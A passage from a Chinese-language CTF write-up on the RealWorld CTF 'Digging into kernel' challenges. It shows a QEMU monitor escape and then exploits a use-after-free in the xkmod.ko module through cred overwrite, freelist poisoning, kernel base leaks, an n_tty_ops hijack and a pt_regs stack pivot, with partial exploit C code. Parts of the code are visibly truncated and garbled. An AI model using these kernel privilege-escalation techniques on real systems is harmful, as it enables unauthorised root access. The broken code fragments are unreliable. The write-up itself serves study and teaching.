@@ -1,0 +1,171 @@
+# 0x00.一切开始之前
+在今年的 RealWorld CTF 国际赛 + 高校赛中只有两道 kernel pwn
+题，两道题目实际上是同一道题，因为第一题由于启动脚本漏洞所以可以直接拿
+flag所以第二道题其实是对第一道题目的脚本的修复，比赛过程中笔者发现其解法十分白给因此很快就秒掉了
+但在比赛过去这么多天后，笔者又思考了一下，RWCTF
+作为这么大的一个赛事，虽然这道内核题属于高校赛道，但不应当连签到题的难度都没有，因此笔者重新回来审视这一道题，希望
+**能够还原出题人原本的想法，并找到预期解**
+# 0x01.Digging into kernel
+首先查看启动脚本
+    qemu-system-x86_64 \
+        -kernel bzImage \
+        -initrd rootfs.cpio \
+        -append "console=ttyS0 root=/dev/ram rdinit=/sbin/init quiet kalsr" \
+        -cpu kvm64,+smep,+smap \
+        --nographic
+本题启动脚本中没有把 monitor 设置为 null，题目可以直接不用看了，先按 `ctrl + A` 然后按 `C` 然后 enter 就能进入
+qemu 的 monitor 模式直接拿 flag
+# 0x02.Digging into kernel 2
+## 题目分析
+这一题和上一题其实是 **完全一样的** ，只是修复了启动脚本中 monitor 的漏洞
+### 保护
+首先查看启动脚本
+    qemu-system-x86_64 \
+        -kernel bzImage \
+        -initrd rootfs.cpio \
+        -append "console=ttyS0 root=/dev/ram rdinit=/sbin/init quiet kalsr" \
+        -cpu kvm64,+smep,+smap \
+        -monitor null \
+        --nographic
+开启了 smep 和 smap，这里出题人将 kaslr 写成了 kalsr，不过并不影响 kaslr 的默认开启
+查看 `/sys/devices/system/cpu/vulnerabilities/*`：
+    /home $ cat /sys/devices/system/cpu/vulnerabilities/*
+    Processor vulnerable
+    Mitigation: PTE Inversion
+    Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown
+    Mitigation: PTI
+    Vulnerable
+    Mitigation: usercopy/swapgs barriers and __user pointer sanitization
+    Mitigation: Full generic retpoline, STIBP: disabled, RSB filling
+    Not affected
+开启了 KPTI
+### 逆向分析
+题目给出了一个 `xkmod.ko` 文件，按照惯例这应当就是有漏洞的 LKM，拖入 IDA 进行分析
+在模块载入时会新建一个 kmem_cache 叫 `"lalala"`，对应 object 大小是 192，这里我们注意到后面三个参数都是 0 ，对应的是
+align（对齐）、flags（标志位）、ctor（构造函数）
+定义了一个常规的菜单堆，给了分配、编辑、读取 object 的功能，这里的 buf 是一个全局指针，我们可以注意到 ioctl 中所有的操作
+**都没有上锁**
+我们应当传入如下结构体：
+    struct Data
+    {
+        size_t *ptr;
+        unsigned int offset;
+        unsigned int length;
+    }data;
+还定义了一个 `copy_overflow()` 函数，不过笔者暂时没有发现在哪里有用到这个函数
+漏洞点主要在关闭设备文件时会释放掉 buf，但是没有将 buf 指针置 NULL， **只要我们同时打开多个设备文件便能完成 UAF**
+## 漏洞利用
+我们有着一个功能全面的“堆面板”，还拥有着近乎可以无限次利用的 UAF，我们已经可以在内核空间中为所欲为了（甚至不需要使用 ioctl
+未上锁的漏洞），因此解法也是多种多样的，这里由笔者提供两个解法
+### 解法一：利用 UAF 修改子进程的 cred 完成提权
+笔者在当时比赛时便发现这道题 **基本上和 CISCN_2017 的 babydriver 是一致的** ，不同在于这道题限制了我们分配的 object
+的大小为 192，且从一个“独立的” kmem_cache 中取出 object，但是由于在创建该 kmem_cache 时并未设置任何
+flag，这会导致其与现有的大小一致的 kmem_cache **发生合并** ，而经笔者实测，创建进程时的 cred 也会从该 kmem_cache
+中取，因此我们可以 **直接修改子进程的 cred 完成提权** ，这个解法和 CISCN_2017 的 babydriver **完全一致**
+exp 如下：
+    #include 
+    #include 
+    #include 
+    #include 
+    struct Data
+    {
+        size_t *ptr;
+        unsigned int offset;
+        unsigned int length;
+    }data;
+    void alloc(int dev_fd)
+    {
+        ioctl(dev_fd, 0x1111111);
+    }
+    void edit(int dev_fd, struct Data *data)
+    {
+        ioctl(dev_fd, 0x6666666, data);
+    }
+    void get(int dev_fd, struct Data *data)
+    {
+        ioctl(dev_fd, 0x7777777, data);
+    }
+    int main(int argc, char **argv, char *envp)
+    {
+        int dev_fd[2];
+        size_t buf[0x100];
+        for (int i = 0; i read 完成提权
+现在让我们回到这道题的本质： **若是我们有着一个独立 kmem_cache 的 UAF** ，我们又该如何去利用呢？
+#### Step.I 实现内核任意地址读写
+我们先看看能够利用 UAF 获取到什么信息，经笔者多次尝试可以发现当我们将 buf 释放掉之后读取其中数据时其前 8 字节都是一个
+**位于内核堆上的指针** ，但通常有着不同的页内偏移，这说明：
+  * 该 kmem_cache 的 offset 为 0
+  * 该 kernel 未开启 HARDENED_FREELIST 保护
+  * 该 kernel 开启了 RANDOM_FREELIST 保护
+freelist 随机化保护并非是一个运行时保护，而是在为 slub 分配页面时会将页面内的 object 指针随机打乱，
+**但是在后面的分配释放中依然遵循着后进先出的原则** ，因此我们可以先获得一个 object 的 UAF，修改其 next
+为我们想要分配的地址，之后我们连续进行两次分配 **便能够成功获得目标地址上的 object ，实现任意地址读写**
+但这么做有着一个小问题，当我们分配到目标地址时 **目标地址前 8 字节的数据会被写入 freelist，而这通常并非一个有效的地址** ，从而导致
+kernel panic，因此我们应当尽量选取目标地址往前的一个有着 8 字节 0 的区域，从而使得 freelist 获得一个 NULL 指针，促使
+kmem_cache 向 buddy system 请求一个新的 slub，这样就不会发生 crash
+> 可能有细心的同学发现了：原来的 slub 上面还有一定数量的空闲 object，直接丢弃的话 **会导致内存泄漏的发生**
+> ，但首先这一小部分内存的泄露并不会造成负面的影响，其次 **这也不是我们作为攻击者应该关注的问题** （笑）
+#### Step.II 泄露 page_offset_base 与内核 .text 段基址
+接下来我们考虑如何泄露内核基址，在内核“堆基址”（`page_offset_base`） + `0x9d000` 处存放着
+`secondary_startup_64` 函数的地址，而我们可以从 free object 的 next
+指针获得一个堆上地址，从而去猜测堆的基址，之后分配到一个 `堆基址 + 0x9d000` 处的 object 以泄露内核基址，这个地址前面刚好有一片为
+NULL 的区域方便我们分配
+若是没有猜中，笔者认为直接重试即可，但这里需要注意的是我们不能够直接退出，而应当保留原进程的文件描述符打开，否则会在退出进程时触发 slub 的
+double free 检测，不过经笔者测验大部分情况下都能够猜中堆基址
+    alloc(dev_fd[0], &data);
+        edit(dev_fd[0], &data);
+        close(dev_fd[0]);
+        get(dev_fd[1], &data);
+        kernel_heap_leak = data.ptr[0];
+        page_offset_base = kernel_heap_leak & 0xfffffffff0000000;
+        printf("[+] kernel heap leak: %p\n", kernel_heap_leak);
+        printf("[!] GUESSING page_offset_base: %p\n", page_offset_base);
+        puts("[*] leaking kernel base...");
+        data.ptr[0] = page_offset_base + 0x9d000 - 0x10; // set next->next to be NULL to avoid the crash in allocating
+        data.offset = 0;
+        data.length = 8;
+        edit(dev_fd[1], &data);
+        alloc(dev_fd[1], &data);
+        alloc(dev_fd[1], &data);
+        data.length = 0x50;
+        get(dev_fd[1], &data);
+        for (int i = 0; i read`）
+    static struct tty_ldisc_ops n_tty_ops = {
+        .owner       = THIS_MODULE,
+        .num         = N_TTY,
+        .name            = "n_tty",
+        .open            = n_tty_open,
+        .close           = n_tty_close,
+        .flush_buffer    = n_tty_flush_buffer,
+        .read            = n_tty_read,
+        .write           = n_tty_write,
+        .ioctl           = n_tty_ioctl,
+        .set_termios     = n_tty_set_termios,
+        .poll            = n_tty_poll,
+        .receive_buf     = n_tty_receive_buf,
+        .write_wakeup    = n_tty_write_wakeup,
+        .receive_buf2    = n_tty_receive_buf2,
+    };
+我们可以使用 pwntools 搜索其中的部分函数指针以定位其在内核空间中的地址
+其 num 成员刚好为 0，可以方便我们将 freelist 链接到这里
+我们只需要修改任一指针进行触发便能劫持
+RIP，下图是来自日本某安全大会（[网图](https://www.anquanke.com/post/id/172250)，原出处已不可考）对劫持
+`n_tty_ops` 的解析，其中第一条是通过 `scanf()` 触发 `n_tty_ops->read`，但 scanf 本质上调用了 `read`
+系统调用，因此我们 **直接调用 read 系统调用** 便能触发 `n_tty_ops->read`
+#### Step.IV 利用 pt_regs 完成栈迁移
+关注过笔者或是此前曾经阅读过笔者文章的同学应该都知道笔者有一个 **只用劫持一个指针便能构造 ROP** 的方法——利用 `pt_regs`
+结构体，下面笔者将复制一遍笔者此前讲过无数遍的一个知识点（笑）
+当我们进行系统调用时，内核会将所有的寄存器 **压入内核栈上，形成一个 pt_regs 结构体**
+，该结构体实质上位于内核栈底，[定义](https://elixir.bootlin.com/linux/latest/source/arch/x86/include/uapi/asm/ptrace.h#L44)如下：
+    struct pt_regs {
+    /*
+     * C ABI says these regs are callee-preserved. They aren't saved on kernel entry
+     * unless syscall needs a complete, fully filled "struct pt_regs".
+     */
+        unsigned long r15;
+        unsigned long r14;
+        unsigned long r13;
+        unsigned long r12;
+        unsigned long rbp;
+        unsigned long rbx;
+    /* These regs are callee-clobbered. Always saved on kernel entry. */
